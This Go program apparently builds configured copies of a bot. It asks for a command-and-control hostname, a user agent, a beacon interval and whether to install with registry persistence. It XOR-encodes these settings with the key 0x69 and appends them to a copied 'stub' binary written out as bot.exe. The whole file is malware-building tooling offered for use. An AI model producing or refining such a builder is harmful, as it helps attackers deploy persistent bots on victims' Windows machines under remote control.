package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"unsafe"
)

func IntToByteArray(num int32) []byte {
	size := int(unsafe.Sizeof(num))
	arr := make([]byte, size)
	for i := 0; i < size; i++ {
		byt := *(*uint8)(unsafe.Pointer(uintptr(unsafe.Pointer(&num)) + uintptr(i)))
		arr[3-i] = byt
	}
	return arr
}

func main() {
	var install, registry string
	userAgentBytes := make([]byte, 256)
	domainBytes := make([]byte, 56)
	var userAgent, domain []byte
	var interval int32
	fmt.Print("Hostname (Max 56 bytes): ")
	fmt.Scanln(&domain)
	copy(domainBytes, domain)
	fmt.Print("User Agent (Max 256 bytes): ")
	fmt.Scanln(&userAgent)
	copy(userAgentBytes, userAgent)
	fmt.Print("Interval: ")
	fmt.Scanln(&interval)
	fmt.Print("Install [y/n]: ")
	fmt.Scanln(&install)
	fmt.Print("Registry [y/n]: ")
	fmt.Scanln(&registry)
	var installNumber int8
	var registryNumber int8
	if install == "y" {
		installNumber = 1
	} else {
		installNumber = 0
	}
	if registry == "y" {
		registryNumber = 1
	} else {
		registryNumber = 0
	}
	var payload []byte
	payload = append(payload, domainBytes...)
	payload = append(payload, userAgentBytes...)
	payload = append(payload, IntToByteArray(interval)...)
	payload = append(payload, byte(installNumber))
	payload = append(payload, byte(registryNumber))
	for i := 0; i < len(payload); i++ {
		payload[i] ^= 0x69
	}
	os.Remove("bot.exe")
	CopyFile("stub", "bot.exe")
	f, err := os.OpenFile("bot.exe", os.O_RDWR, 0644)
	if err != nil {
		panic(err)
	}
	defer f.Close()
	stat, err := os.Stat("bot.exe")
	if err != nil {
		panic(err)
	}
	start := stat.Size()
	_, err = f.WriteAt(payload, start)
	if err != nil {
		panic(err)
	}
}

func CopyFile(src, dst string) error {
	input, err := ioutil.ReadFile(src)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(dst, input, 0644)
	if err != nil {
		return err
	}
	return nil
}